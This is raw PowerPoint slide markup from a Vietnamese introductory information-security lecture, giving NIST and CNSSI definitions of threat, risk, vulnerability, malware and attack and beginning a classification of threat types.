          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800"/>
              <a:t> Tấn công</a:t>
            </a:r>
            <a:endParaRPr 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42723">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5427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42723">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="54272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42723">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="54272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42723">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="54272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542723">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="54272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542723">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="54272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 TỔNG QUAN NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> GÂY MẤT ATTT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1"/>
              <a:t>1. Khái niệm cơ bản</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t> / Mối đe dọa(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>hreat): </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1"/>
              <a:t>Bất kỳ tình huống hoặc sự kiện nào có tiềm năng ảnh hưởng tiêu cực</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1"/>
              <a:t>hoạt động của tổ chức (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t>bao gồm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1"/>
              <a:t>nhiệm vụ, chức năng, hình ảnh, hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1"/>
              <a:t>danh tiếng), tài sản tổ chức, cá nhâ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t>n, hoặc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1"/>
              <a:t>quốc gia thông qua truy cập trái phép</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1"/>
              <a:t>hệ thống thông tin,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t> phá hủy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1"/>
              <a:t>, tiết lộ, sửa đổi thông tin, và / hoặc từ chối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1"/>
              <a:t>dịch vụ.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t>” (SP 800-53; SP 800-53A; SP 800-27; SP 800-60; SP 800-37; CNSSI-4009, FIPS 200 ).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t>SP - NIST (National Institute of Standards and Technology) Special Publication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t>CNSSI - Committee on National Security Systems Instruction</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t>FIPS - Federal Information Processing Standards</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:endParaRPr lang="en-US" i="1"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" i="1"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11849239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 TỔNG QUAN NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> GÂY MẤT ATTT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1"/>
              <a:t>1. Khái niệm cơ bản</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1"/>
              <a:t>Rủi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" err="1"/>
              <a:t>ro</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1"/>
              <a:t> (Risk): </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" i="1"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>Là m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>ức độ ảnh hưởng đến hoạt động của tổ chức (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>bao gồm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>nhiệm vụ,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>chức năng, hình ảnh hoặc danh tiếng), tài sản tổ chức hoặc cá nhân</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>, bắt nguồn từ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>hoạt động của hệ thống thông tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>chịu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>tác động của </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>và khả năng xảy ra </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>đó.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>” (FIPS 200, SP 800-60)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> “Là m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>ức độ một thực thể bị đe doạ bởi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>ơ,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>ợc đo bởi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>: (i)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>tác động bất lợi có thể nảy sinh nếu xảy ra </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>ơ;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>và (ii) khả năng xảy ra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> đó</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>” (SP 800-53, CNSSI-4009, SP 800-37; SP 800-53A).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33007246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 TỔNG QUAN NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> GÂY MẤT ATTT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0" err="1"/>
              <a:t>Khái</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0" err="1"/>
              <a:t>niệm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0" err="1"/>
              <a:t>cơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0" err="1"/>
              <a:t>bản</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Lỗ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>hổng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> (Vulnerability):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1" dirty="0"/>
              <a:t>Là điểm yếu trong một hệ thống thông tin, quy trình bảo mật hệ thống,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1" dirty="0"/>
              <a:t>kiểm soát nội bộ hoặc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>thực</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>thi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>mà</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1" dirty="0"/>
              <a:t>có thể bị khai thác hoặc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>bị</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1" dirty="0"/>
              <a:t> kích hoạt bởi một </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>mối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>nguy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1" dirty="0"/>
              <a:t>ơ.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0"/>
              <a:t>NIST-SP 800-53; SP 800 -37</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="vi-VN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" b="1"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13550839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 TỔNG QUAN NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> GÂY MẤT ATTT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1"/>
              <a:t>1. Khái niệm cơ bản</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Mã độc (Malware):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>“Là m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>ột chương trình được chèn vào một hệ thống, thường là bí mật, với</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>ý định làm ảnh hưởng đến tính bảo mật, tính toàn vẹn hoặc tính </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>sẵn sàng của </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>dữ liệu, ứng dụng, hoặc hệ điều hành của nạn nhân hoặc làm phiền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>, làm gián đoạn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>nạn nhân.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t>(SP 800-83)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10894576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 TỔNG QUAN NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> GÂY MẤT ATTT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1"/>
              <a:t>1. Khái niệm cơ bản</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Tấn công (Attack):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>Là</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>bất kỳ loại hoạt động độc hại nào cố gắng thu thập, làm gián đoạn, từ chối, làm suy thoái, hoặc hủy hoại tài nguyên hệ thống thông tin hoặc chính thông tin.” (CNSSI-4009)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16774255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 TỔNG QUAN NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> GÂY MẤT ATTT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1"/>
              <a:t>2. Phân loại nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3000" b="1"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2700"/>
              <a:t>Theo bản chất xuất hiện</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tự nhiên</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> nhân tạo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2700"/>
              <a:t>Theo mức độ định trước</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> của hành động ngẫu nhiên và/hoặc Nguy cơ sinh ra do các lỗi hoặc sự bất cẩn của con ng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>ời/</a:t>
